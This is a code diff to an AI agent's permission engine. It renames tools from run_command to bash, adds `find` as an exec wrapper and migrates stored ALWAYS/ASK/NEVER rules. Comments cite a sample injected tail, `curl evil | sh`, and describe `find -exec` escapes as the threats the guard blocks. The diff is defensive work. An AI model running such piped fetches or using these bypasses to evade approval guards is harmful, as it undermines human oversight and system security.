@@ -1,6 +1,6 @@
 """Permission engine — glob-pattern rules with ALWAYS/ASK/NEVER levels.
 
-Each rule maps a pattern like "run_command:himalaya*list*" to a permission level.
+Each rule maps a pattern like "bash:himalaya*list*" to a permission level.
 The engine checks tool calls against these patterns to decide whether to execute
 immediately, ask the user for approval, or block entirely.
 """
@@ -56,8 +56,11 @@ _INTERPRETERS = {
 }
 # Exec wrappers: run whatever follows, and their filler args can push an
 # interpreter past _rule_pattern's token cap (`env A=1 python3 -c …`).
+# `find` counts too: `-exec cmd {} +` runs an arbitrary command with no shell
+# control char, so a generalized `find .*` rule would auto-approve it.
 _EXEC_WRAPPERS = {
     "env",
+    "find",
     "sudo",
     "doas",
     "su",
@@ -80,7 +83,7 @@ _EXEC_WRAPPERS = {
 _NET_FETCHERS = {"curl", "wget"}
 
 # Shell control characters that can chain, redirect, or substitute a SECOND
-# command. run_command executes the whole string via /bin/sh -c, so a wildcard
+# command. bash executes the whole string via /bin/sh -c, so a wildcard
 # ("…*") rule must never auto-approve a command containing any of these — the `*`
 # would blindly cover an unapproved tail (`jq .name; curl evil | sh`). Guarded in
 # check(); _rule_pattern also refuses to generalize such a command in the first place.
@@ -95,73 +98,73 @@ def _has_shell_control(command: str) -> bool:
 # Default rules — read operations are ALWAYS, write operations ASK, destructive NEVER.
 DEFAULT_RULES: dict[str, str] = {
     # Read operations — safe by default
-    "run_command:himalaya*list*": "ALWAYS",
-    "run_command:himalaya*read*": "ALWAYS",
-    "run_command:himalaya*envelope*": "ALWAYS",
-    "run_command:himalaya*folder*": "ALWAYS",
-    "run_command:python3 /app/tools/contacts.py*": "ALWAYS",
-    "run_command:python3 tools/contacts.py*": "ALWAYS",
-    "run_command:python3 /app/tools/calendar_read.py*": "ALWAYS",
-    "run_command:python3 tools/calendar_read.py*": "ALWAYS",
+    "bash:himalaya*list*": "ALWAYS",
+    "bash:himalaya*read*": "ALWAYS",
+    "bash:himalaya*envelope*": "ALWAYS",
+    "bash:himalaya*folder*": "ALWAYS",
+    "bash:python3 /app/tools/contacts.py*": "ALWAYS",
+    "bash:python3 tools/contacts.py*": "ALWAYS",
+    "bash:python3 /app/tools/calendar_read.py*": "ALWAYS",
+    "bash:python3 tools/calendar_read.py*": "ALWAYS",
     # wacli read operations — all pre-approved
-    "run_command:wacli*messages*": "ALWAYS",
-    "run_command:wacli*contacts search*": "ALWAYS",
-    "run_command:wacli*contacts show*": "ALWAYS",
-    "run_command:wacli*chats*": "ALWAYS",
-    "run_command:wacli*groups list*": "ALWAYS",
-    "run_command:wacli*groups info*": "ALWAYS",
-    "run_command:wacli*sync*": "ALWAYS",
-    "run_command:wacli*search*": "ALWAYS",
+    "bash:wacli*messages*": "ALWAYS",
+    "bash:wacli*contacts search*": "ALWAYS",
+    "bash:wacli*contacts show*": "ALWAYS",
+    "bash:wacli*chats*": "ALWAYS",
+    "bash:wacli*groups list*": "ALWAYS",
+    "bash:wacli*groups info*": "ALWAYS",
+    "bash:wacli*sync*": "ALWAYS",
+    "bash:wacli*search*": "ALWAYS",
     # wacli write operations — require approval
-    "run_command:wacli*contacts refresh*": "ASK",
-    "run_command:wacli*contacts alias*": "ASK",
-    "run_command:wacli*contacts tags*": "ASK",
-    "run_command:wacli*groups refresh*": "ASK",
-    "run_command:wacli*groups rename*": "ASK",
-    "run_command:wacli*groups participants*": "ASK",
-    "run_command:wacli*groups invite*": "ASK",
-    "run_command:wacli*groups join*": "ASK",
-    "run_command:wacli*groups leave*": "ASK",
-    "run_command:wacli*send*": "ASK",
+    "bash:wacli*contacts refresh*": "ASK",
+    "bash:wacli*contacts alias*": "ASK",
+    "bash:wacli*contacts tags*": "ASK",
+    "bash:wacli*groups refresh*": "ASK",
+    "bash:wacli*groups rename*": "ASK",
+    "bash:wacli*groups participants*": "ASK",
+    "bash:wacli*groups invite*": "ASK",
+    "bash:wacli*groups join*": "ASK",
+    "bash:wacli*groups leave*": "ASK",
+    "bash:wacli*send*": "ASK",
     # Block direct access to wacli's internal SQLite databases
-    "run_command:sqlite3*wacli*": "NEVER",
-    "run_command:sqlite3*.wacli*": "NEVER",
-    "run_command:sqlite3*/app/data/memory.db*SELECT*": "ALWAYS",
-    "run_command:sqlite3*/app/data/memory.db*INSERT*": "ALWAYS",
-    "run_command:sqlite3*/app/data/memory.db*UPDATE*": "ALWAYS",
-    "run_command:sqlite3*/app/data/memory.db*DELETE*": "ALWAYS",
-    "run_command:sqlite3*data/memory.db*SELECT*": "ALWAYS",
-    "run_command:sqlite3*data/memory.db*INSERT*": "ALWAYS",
-    "run_command:sqlite3*data/memory.db*UPDATE*": "ALWAYS",
-    "run_command:sqlite3*data/memory.db*DELETE*": "ALWAYS",
-    "run_command:python3 /app/tools/jobs.py list*": "ALWAYS",
-    "run_command:python3 /app/tools/jobs.py show*": "ALWAYS",
-    "run_command:python3 tools/jobs.py list*": "ALWAYS",
-    "run_command:python3 tools/jobs.py show*": "ALWAYS",
-    "run_command:python3 /app/tools/jobs.py create*": "ASK",
-    "run_command:python3 /app/tools/jobs.py edit*": "ASK",
-    "run_command:python3 /app/tools/jobs.py remove*": "ASK",
-    "run_command:python3 /app/tools/jobs.py cancel*": "ASK",
-    "run_command:python3 tools/jobs.py create*": "ASK",
-    "run_command:python3 tools/jobs.py edit*": "ASK",
-    "run_command:python3 tools/jobs.py remove*": "ASK",
-    "run_command:python3 tools/jobs.py cancel*": "ASK",
-    "run_command:python3 /app/tools/skills.py list*": "ALWAYS",
-    "run_command:python3 /app/tools/skills.py show*": "ALWAYS",
-    "run_command:python3 /app/tools/skills.py upsert*": "ASK",
-    "run_command:python3 /app/tools/skills.py delete*": "ASK",
-    "run_command:python3 tools/skills.py list*": "ALWAYS",
-    "run_command:python3 tools/skills.py show*": "ALWAYS",
-    "run_command:python3 tools/skills.py upsert*": "ASK",
-    "run_command:python3 tools/skills.py delete*": "ASK",
-    "run_command:jq*": "ALWAYS",
-    "run_command:curl*wttr.in*": "ALWAYS",
-    "run_command:w3m*": "ALWAYS",
-    "run_command:pandoc*": "ALWAYS",
-    "run_command:pdftotext*": "ALWAYS",
-    "run_command:rg*": "ALWAYS",
-    "run_command:yt-dlp*": "ALWAYS",
-    "run_command:cal*": "ALWAYS",
+    "bash:sqlite3*wacli*": "NEVER",
+    "bash:sqlite3*.wacli*": "NEVER",
+    "bash:sqlite3*/app/data/memory.db*SELECT*": "ALWAYS",
+    "bash:sqlite3*/app/data/memory.db*INSERT*": "ALWAYS",
+    "bash:sqlite3*/app/data/memory.db*UPDATE*": "ALWAYS",
+    "bash:sqlite3*/app/data/memory.db*DELETE*": "ALWAYS",
+    "bash:sqlite3*data/memory.db*SELECT*": "ALWAYS",
+    "bash:sqlite3*data/memory.db*INSERT*": "ALWAYS",
+    "bash:sqlite3*data/memory.db*UPDATE*": "ALWAYS",
+    "bash:sqlite3*data/memory.db*DELETE*": "ALWAYS",
+    "bash:python3 /app/tools/jobs.py list*": "ALWAYS",
+    "bash:python3 /app/tools/jobs.py show*": "ALWAYS",
+    "bash:python3 tools/jobs.py list*": "ALWAYS",
+    "bash:python3 tools/jobs.py show*": "ALWAYS",
+    "bash:python3 /app/tools/jobs.py create*": "ASK",
+    "bash:python3 /app/tools/jobs.py edit*": "ASK",
+    "bash:python3 /app/tools/jobs.py remove*": "ASK",
+    "bash:python3 /app/tools/jobs.py cancel*": "ASK",
+    "bash:python3 tools/jobs.py create*": "ASK",
+    "bash:python3 tools/jobs.py edit*": "ASK",
+    "bash:python3 tools/jobs.py remove*": "ASK",
+    "bash:python3 tools/jobs.py cancel*": "ASK",
+    "bash:python3 /app/tools/skills.py list*": "ALWAYS",
+    "bash:python3 /app/tools/skills.py show*": "ALWAYS",
+    "bash:python3 /app/tools/skills.py upsert*": "ASK",
+    "bash:python3 /app/tools/skills.py delete*": "ASK",
+    "bash:python3 tools/skills.py list*": "ALWAYS",
+    "bash:python3 tools/skills.py show*": "ALWAYS",
+    "bash:python3 tools/skills.py upsert*": "ASK",
+    "bash:python3 tools/skills.py delete*": "ASK",
+    "bash:jq*": "ALWAYS",
+    "bash:curl*wttr.in*": "ALWAYS",
+    "bash:w3m*": "ALWAYS",
+    "bash:pandoc*": "ALWAYS",
+    "bash:pdftotext*": "ALWAYS",
+    "bash:rg*": "ALWAYS",
+    "bash:yt-dlp*": "ALWAYS",
+    "bash:cal*": "ALWAYS",
     # Common read-only Unix commands (#148) — noisy to ASK for on every fresh
     # agent. Safe because the check() shell-control guard still blocks any
     # wildcard auto-approval of a command carrying ; | & $() ` < > (redirects,
@@ -170,71 +173,65 @@ DEFAULT_RULES: dict[str, str] = {
     # …` runs arbitrary code with no shell-control char, so the guard can't catch
     # it; it stays ASK, same as xargs/sudo). `tr` uses a `tr *` pattern, not
     # `tr*`, so it can't bleed onto destructive `truncate`.
-    "run_command:cat*": "ALWAYS",
-    "run_command:ls*": "ALWAYS",
-    "run_command:echo*": "ALWAYS",
-    "run_command:head*": "ALWAYS",
-    "run_command:tail*": "ALWAYS",
-    "run_command:date*": "ALWAYS",
-    "run_command:pwd*": "ALWAYS",
-    "run_command:whoami*": "ALWAYS",
-    "run_command:id*": "ALWAYS",
-    "run_command:uname*": "ALWAYS",
-    "run_command:hostname*": "ALWAYS",
-    "run_command:which*": "ALWAYS",
-    "run_command:wc*": "ALWAYS",
-    "run_command:sort*": "ALWAYS",
-    "run_command:uniq*": "ALWAYS",
-    "run_command:cut*": "ALWAYS",
-    "run_command:tr *": "ALWAYS",
-    "run_command:du*": "ALWAYS",
-    "run_command:df*": "ALWAYS",
-    "run_command:file*": "ALWAYS",
-    "run_command:basename*": "ALWAYS",
-    "run_command:dirname*": "ALWAYS",
-    "run_command:printenv*": "ALWAYS",
+    "bash:cat*": "ALWAYS",
+    "bash:ls*": "ALWAYS",
+    "bash:echo*": "ALWAYS",
+    "bash:head*": "ALWAYS",
+    "bash:tail*": "ALWAYS",
+    "bash:date*": "ALWAYS",
+    "bash:pwd*": "ALWAYS",
+    "bash:whoami*": "ALWAYS",
+    "bash:id*": "ALWAYS",
+    "bash:uname*": "ALWAYS",
+    "bash:hostname*": "ALWAYS",
+    "bash:which*": "ALWAYS",
+    "bash:wc*": "ALWAYS",
+    "bash:sort*": "ALWAYS",
+    "bash:uniq*": "ALWAYS",
+    "bash:cut*": "ALWAYS",
+    "bash:tr *": "ALWAYS",
+    "bash:du*": "ALWAYS",
+    "bash:df*": "ALWAYS",
+    "bash:file*": "ALWAYS",
+    "bash:basename*": "ALWAYS",
+    "bash:dirname*": "ALWAYS",
+    "bash:printenv*": "ALWAYS",
     # cp writes files (into the workspace) — treat like other write ops: ask first.
-    "run_command:cp*": "ASK",
-    "run_command:git*log*": "ALWAYS",
-    "run_command:git*status*": "ALWAYS",
-    "run_command:git*diff*": "ALWAYS",
-    "run_command:git*show*": "ALWAYS",
-    "run_command:git*branch*": "ALWAYS",
-    "run_command:gh*list*": "ALWAYS",
-    "run_command:gh*view*": "ALWAYS",
-    "run_command:gh*status*": "ALWAYS",
-    "run_command:gh*api*": "ALWAYS",
-    "run_command:gh*search*": "ALWAYS",
-    "run_command:gh*issue create*": "ASK",
-    "run_command:gh*pr create*": "ASK",
-    "run_command:gh*release create*": "ASK",
+    "bash:cp*": "ASK",
+    "bash:git*log*": "ALWAYS",
+    "bash:git*status*": "ALWAYS",
+    "bash:git*diff*": "ALWAYS",
+    "bash:git*show*": "ALWAYS",
+    "bash:git*branch*": "ALWAYS",
+    "bash:gh*list*": "ALWAYS",
+    "bash:gh*view*": "ALWAYS",
+    "bash:gh*status*": "ALWAYS",
+    "bash:gh*api*": "ALWAYS",
+    "bash:gh*search*": "ALWAYS",
+    "bash:gh*issue create*": "ASK",
+    "bash:gh*pr create*": "ASK",
+    "bash:gh*release create*": "ASK",
     # Browser automation — reading is safe, acting (click/fill/submit) asks.
     # Per-domain rules work because every command carries `--url`, e.g. add
-    # "run_command:*browser.py act*github.com*": "ALWAYS" via the admin UI.
-    "run_command:*browser.py read*": "ALWAYS",
-    "run_command:*browser.py screenshot*": "ALWAYS",
-    "run_command:*browser.py profiles*": "ALWAYS",
-    "run_command:*browser.py act*": "ASK",
+    # "bash:*browser.py act*github.com*": "ALWAYS" via the admin UI.
+    "bash:*browser.py read*": "ALWAYS",
+    "bash:*browser.py screenshot*": "ALWAYS",
+    "bash:*browser.py profiles*": "ALWAYS",
+    "bash:*browser.py act*": "ASK",
     # explore self-drives autonomously under one approval (#2); always confirm.
-    "run_command:*browser.py explore*": "ASK",
-    "run_command:git*push*": "ASK",
-    "run_command:git*commit*": "ASK",
+    "bash:*browser.py explore*": "ASK",
+    "bash:git*push*": "ASK",
+    "bash:git*commit*": "ASK",
     "web_search": "ALWAYS",
     "recall_memory": "ALWAYS",
     "remember": "ALWAYS",  # local memory write, low-stakes — no prompt (#13)
-    # Coding harness (#76) — reads pre-approved, writes/exec ask (confined to the
+    # Skill bodies live in the skills DB — reading them must never prompt (#178).
+    "bash:sqlite3*skills.db*SELECT*": "ALWAYS",
+    # Coding harness (#76) — reads pre-approved, writes ask (confined to the
     # configured workspace root regardless; see core/coding.py).
-    "read_file": "ALWAYS",
-    "list_dir": "ALWAYS",
-    "grep": "ALWAYS",
-    "write_file": "ASK",
-    "edit_file": "ASK",
-    # run_command_in_dir has NO bare-name rule on purpose: it is keyed as
-    # "run_command:<command>" (see _build_match_key), so it inherits every
-    # run_command rule — the hard NEVER rails block it, an owner's ALWAYS rule for
-    # a safe read command (git log, rg, …) runs it without a prompt, and anything
-    # else falls through to the default ASK. It is also a write action, so a run
-    # is never deduped/cached: repeat builds/tests re-ask each time.
+    "read": "ALWAYS",
+    "write": "ASK",
+    "edit": "ASK",
     # Write operations — ask first
     "send_email": "ASK",
     "reply_email": "ASK",
@@ -244,27 +241,20 @@ DEFAULT_RULES: dict[str, str] = {
     "set_reaction": "ALWAYS",
     "create_calendar_event": "ASK",
     "create_contact": "ASK",
-    "run_command:himalaya*send*": "ASK",
-    "run_command:himalaya*delete*": "ASK",
-    "run_command:himalaya*move*": "ASK",
+    "bash:himalaya*send*": "ASK",
+    "bash:himalaya*delete*": "ASK",
+    "bash:himalaya*move*": "ASK",
     "schedule_task": "ASK",
     "manage_jobs": "ASK",
     # Delegating to a subagent is approved once per spawn; the subagent then runs
     # autonomously within its narrowed scope (system semantics), like a job.
     "spawn_subagent": "ASK",
-    # Publishing a web artifact is now just a write_file under {workspace}/artifacts/
-    # (issue #82) — it inherits the write_file ASK rule, no separate entry.
+    # Publishing a web artifact is now just a write under {workspace}/artifacts/
+    # (issue #82) — it inherits the write ASK rule, no separate entry.
     # Dangerous — never allow
-    "run_command:sqlite3*DROP*": "NEVER",
-    "run_command:sqlite3*ALTER*": "NEVER",
-    "load_skill": "ALWAYS",
-    # Read-only skill-catalogue browsing — safe and high-frequency, same as
-    # load_skill. Seeded as defaults so they don't rely on auto-learning a rule
-    # (which #79 now refuses for whole-tool keys). The secret-vault read tools
-    # (list_secrets/request_secret) are deliberately left to ASK.
-    "search_skills": "ALWAYS",
-    "list_skills": "ALWAYS",
-    # Read-only contacts lookup — safe, high-frequency (mirrors search_skills).
+    "bash:sqlite3*DROP*": "NEVER",
+    "bash:sqlite3*ALTER*": "NEVER",
+    # Read-only contacts lookup — safe, high-frequency.
     "search_contacts": "ALWAYS",
 }
 
@@ -326,7 +316,42 @@ class PermissionEngine:
             else:
                 db.execute(_CREATE_PERMISSIONS)
             db.execute("CREATE TABLE IF NOT EXISTS yolo (scope TEXT PRIMARY KEY)")
+            self._migrate_tool_renames(db)
         self._ready = True
+
+    # Tool renames (#178): run_command→bash, read_file→read, write_file→write,
+    # edit_file→edit; run_command_in_dir folded into bash; list_dir/grep/
+    # load_skill/search_skills/list_skills removed. Persisted rules (owner-added
+    # and auto-learned) must follow, or every learned approval is lost and stale
+    # NEVER rails stop matching. Idempotent — a store with no legacy pattern is
+    # untouched — so it can run on every boot.
+    _LEGACY_RENAMES = {
+        "read_file": "read",
+        "write_file": "write",
+        "edit_file": "edit",
+        "run_command": "bash",
+        "run_command_in_dir": "bash",
+    }
+    _LEGACY_DROPPED = frozenset({"list_dir", "grep", "load_skill", "search_skills", "list_skills"})
+
+    @classmethod
+    def _migrate_tool_renames(cls, db: sqlite3.Connection) -> None:
+        rows = db.execute("SELECT scope, pattern, level FROM permissions").fetchall()
+        for scope, pattern, level in rows:
+            new = None
+            if pattern.startswith("run_command:"):
+                new = "bash:" + pattern[len("run_command:") :]
+            elif pattern in cls._LEGACY_RENAMES:
+                new = cls._LEGACY_RENAMES[pattern]
+            elif pattern not in cls._LEGACY_DROPPED:
+                continue
+            db.execute("DELETE FROM permissions WHERE scope = ? AND pattern = ?", (scope, pattern))
+            if new:
+                db.execute(
+                    "INSERT INTO permissions (scope, pattern, level) VALUES (?, ?, ?) "
+                    "ON CONFLICT(scope, pattern) DO UPDATE SET level = excluded.level",
+                    (scope, new, level),
+                )
 
     def _load_persisted_rules(self) -> None:
         self._ensure_schema()
@@ -396,13 +421,8 @@ class PermissionEngine:
         return scope in self._yolo
 
     def _build_match_key(self, tool_name: str, params: dict | None = None) -> str:
-        # ``run_command_in_dir`` (#76) shares ``run_command``'s rule namespace: the
-        # same shell command must hit the same ALWAYS/ASK/NEVER rails — including
-        # the hard NEVER ones (sqlite DROP/ALTER, wacli dbs, operator path bans) and
-        # the shell-control guard in check() — whether it runs in a workspace dir or
-        # not. cwd-confinement only bounds the working directory, not the command.
-        if tool_name in ("run_command", "run_command_in_dir") and params and "command" in params:
-            return f"run_command:{params['command']}"
+        if tool_name == "bash" and params and "command" in params:
+            return f"bash:{params['command']}"
         return tool_name
 
     @staticmethod
@@ -417,10 +437,10 @@ class PermissionEngine:
         kept tokens are required, and none of the kept tokens may be an interpreter
         (as the last token), an exec-wrapper (anywhere), or a net fetcher (as the
         program) — see the inline note. Such commands keep their exact form and
-        re-ask on the next distinct call. Non run_command keys are returned
+        re-ask on the next distinct call. Non-bash keys are returned
         unchanged.
         """
-        prefix = "run_command:"
+        prefix = "bash:"
         if not match_key.startswith(prefix):
             return match_key
         # Never generalize a command that already contains shell operators — a
@@ -465,8 +485,8 @@ class PermissionEngine:
 
         Auto-learning a rule from a single approval is only safe when the key
         names a specific command shape — a ``tool:subkey`` scope. A bare tool
-        name (no ``:`` sub-scope, or an empty one) — ``run_command`` when the
-        command arg was missing, ``run_command:`` when it was empty, or a whole
+        name (no ``:`` sub-scope, or an empty one) — ``bash`` when the
+        command arg was missing, ``bash:`` when it was empty, or a whole
         tool like ``generate_image`` — would whitelist the ENTIRE tool and
         nullify the allowlist (issue #79). Refuse those: the action keeps
         asking. A rule that broad must be set deliberately via the admin UI,
@@ -494,19 +514,18 @@ class PermissionEngine:
             "schedule_task",
             "manage_jobs",
             "spawn_subagent",
-            "write_file",
-            "edit_file",
-            "run_command_in_dir",
+            "write",
+            "edit",
         }:
             return True
 
         match_key = self._build_match_key(tool_name, params)
-        if match_key.startswith("run_command:"):
-            command = match_key[len("run_command:") :].strip().lower()
+        if match_key.startswith("bash:"):
+            command = match_key[len("bash:") :].strip().lower()
             for pattern, level in self.rules.items():
                 if level != PermissionLevel.ASK:
                     continue
-                if not pattern.startswith("run_command:"):
+                if not pattern.startswith("bash:"):
                     continue
                 if fnmatch.fnmatch(match_key, pattern):
                     return True
@@ -521,7 +540,7 @@ class PermissionEngine:
     def check(self, tool_name: str, params: dict | None = None, scope: str = "") -> str:
         """Return the permission level for a tool call.
 
-        Builds a match key like "run_command:himalaya envelope list ..."
+        Builds a match key like "bash:himalaya envelope list ..."
         and checks it against all rules. First match wins, with more
         specific (longer) patterns tried first.
 
@@ -532,13 +551,13 @@ class PermissionEngine:
         match_key = self._build_match_key(tool_name, params)
         rules = self._effective_rules(scope)
 
-        # A run_command carrying shell control chars (; | & $() ` < > newline) can
+        # A bash command carrying shell control chars (; | & $() ` < > newline) can
         # chain a SECOND, unapproved command through /bin/sh -c. Such a command may
         # be auto-approved only by an EXACT rule, never by a wildcard one whose `*`
         # would blindly cover the injected tail (`jq .name*` matching
         # `jq .name; curl evil | sh`). NEVER rules and exact ALWAYS still apply.
-        guard_wildcard_allow = match_key.startswith("run_command:") and _has_shell_control(
-            match_key[len("run_command:") :]
+        guard_wildcard_allow = match_key.startswith("bash:") and _has_shell_control(
+            match_key[len("bash:") :]
         )
 
         # Sort rules by pattern length descending so more specific rules match first
@@ -653,7 +672,7 @@ class PermissionEngine:
                 # Persist a GENERALIZED pattern, not the exact command — otherwise
                 # "always" only ever matches that one verbatim invocation and the
                 # next (different --url/--task/args) prompts again. See _rule_pattern.
-                # A degenerate key (bare run_command/generate_image) is refused so
+                # A degenerate key (bare bash/generate_image) is refused so
                 # one click can't whitelist the whole tool (#79).
                 self.learn_always_rule(match_key, generalize=True, scope=entry.get("scope", ""))
         if skipped:
@@ -675,7 +694,7 @@ def _preview(text: str, limit: int = 200) -> str:
     """Truncate a free-form field so it can't blow past Telegram's message cap.
 
     Approval prompts interpolate user/agent-supplied strings (a command, a
-    message body). A `run_command` carrying a large heredoc would otherwise
+    message body). A `bash` command carrying a large heredoc would otherwise
     produce a multi-kilobyte prompt that fails to send (#80).
     """
     return text[:limit] + ("…" if len(text) > limit else "")
@@ -723,16 +742,14 @@ def format_approval_message(tool_name: str, params: dict) -> str:
         if action == "list":
             return "List all scheduled jobs"
         return f"Manage jobs: {action}"
-    if tool_name == "run_command":
+    if tool_name == "bash":
         cmd = _preview(params.get("command", "?"))
         purpose = params.get("purpose", "")
-        return f"Run command: {cmd}" + (f"\n({purpose})" if purpose else "")
-    if tool_name == "write_file":
+        workdir = params.get("workdir", "")
+        head = f"Run in {workdir}: {cmd}" if workdir else f"Run command: {cmd}"
+        return head + (f"\n({purpose})" if purpose else "")
+    if tool_name == "write":
         return f"Write file: {params.get('path', '?')}"
-    if tool_name == "edit_file":
+    if tool_name == "edit":
         return f"Edit file: {params.get('path', '?')}"
-    if tool_name == "run_command_in_dir":
-        cmd = _preview(params.get("command", "?"))
-        workdir = params.get("workdir", "?")
-        return f"Run in {workdir}: {cmd}"
     return f"{tool_name}: {params}"
